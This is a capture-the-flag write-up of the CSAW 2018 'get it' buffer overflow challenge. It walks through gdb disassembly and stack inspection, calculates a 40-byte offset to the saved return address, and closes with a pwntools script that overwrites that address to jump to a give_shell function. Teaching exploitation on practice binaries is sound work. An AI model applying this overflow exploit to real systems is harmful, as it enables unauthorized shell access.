# csaw18 get it

Buffer overflow challenge from csaw 18 in nightmare

Main goal is to get control over the saved return address on the stack.

Nothing interesting in the main function, except the fact that it uses the `gets` function that we can exploit with a buffer overflow. 

```nasm
gef➤  disas main
Dump of assembler code for function main:
   0x00000000004005c7 <+0>:	push   rbp
   0x00000000004005c8 <+1>:	mov    rbp,rsp
   0x00000000004005cb <+4>:	sub    rsp,0x30
   0x00000000004005cf <+8>:	mov    DWORD PTR [rbp-0x24],edi
   0x00000000004005d2 <+11>:	mov    QWORD PTR [rbp-0x30],rsi
   0x00000000004005d6 <+15>:	mov    edi,0x40068e
   0x00000000004005db <+20>:	call   0x400470 <puts@plt>
   0x00000000004005e0 <+25>:	lea    rax,[rbp-0x20]
   0x00000000004005e4 <+29>:	mov    rdi,rax
   0x00000000004005e7 <+32>:	mov    eax,0x0
   0x00000000004005ec <+37>:	call   0x4004a0 <gets@plt>
   0x00000000004005f1 <+42>:	mov    eax,0x0
   0x00000000004005f6 <+47>:	leave
   0x00000000004005f7 <+48>:	ret
End of assembler dump.
```

Let’s see all the functions the program has:

```nasm
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000400438  _init
0x0000000000400470  puts@plt
0x0000000000400480  system@plt
0x0000000000400490  __libc_start_main@plt
0x00000000004004a0  gets@plt
0x00000000004004b0  __gmon_start__@plt
0x00000000004004c0  _start
0x00000000004004f0  deregister_tm_clones
0x0000000000400530  register_tm_clones
0x0000000000400570  __do_global_dtors_aux
0x0000000000400590  frame_dummy
0x00000000004005b6  give_shell
0x00000000004005c7  main
0x0000000000400600  __libc_csu_init
0x0000000000400670  __libc_csu_fini
0x0000000000400674  _fini
```

Now we see our target : `give_shell` at the address `0x00000000004005b6`

```nasm
gef➤  disas give_shell
Dump of assembler code for function give_shell:
   0x00000000004005b6 <+0>:	push   rbp
   0x00000000004005b7 <+1>:	mov    rbp,rsp
   0x00000000004005ba <+4>:	mov    edi,0x400684
   0x00000000004005bf <+9>:	call   0x400480 <system@plt>
   0x00000000004005c4 <+14>:	nop
   0x00000000004005c5 <+15>:	pop    rbp
   0x00000000004005c6 <+16>:	ret
```

As expected, this function gives the attacker access to a shell in order to `cat` the `flag`. 

Now let’s run our program in gdb with a breakpoint right after the input (address `0x4005f1`) to inspect the stack behavior: 

Here’s how the stack looks with the input “AAAAAAAAAA” : 

```nasm
────────────────────────────── stack ────────────────────────────
0x00007fffffffe290│+0x0000: 0x00007fffffffe3d8  →  0x00007fffffffe64a  ← $rsp
0x00007fffffffe298│+0x0008: 0x0000000100000000
0x00007fffffffe2a0│+0x0010: "AAAAAAAAAA"	 ← $rax
0x00007fffffffe2a8│+0x0018: 0x0000000000004141 ("AA"?)
0x00007fffffffe2b0│+0x0020: 0x0000000000000000
0x00007fffffffe2b8│+0x0028: 0x0000000000000000
0x00007fffffffe2c0│+0x0030: 0x0000000000000001	 ← $rbp
0x00007fffffffe2c8│+0x0038: 0x00007ffff7db5d90  →  <__libc_start_call_main+128> mov edi, eax
```

As we can see, it’s loaded at the address `0x7fffffffe2a0`, pointed by the `rax` register. Our target is the address `0x7fffffffe2c8`, at $rbp+0x8. 

The offset between our two addresses is easily calculated : `0x38-0x10 = 0x28`, so `40` in decimal. 

Now we have everything we need to know in order to write our script, that will look like this : 

```python
from pwn import *

target = process("./get_it")

payload = b""
payload += b"0"*0x28
payload += p64(0x4005b6)

target.sendline(payload)

target.interactive()
```
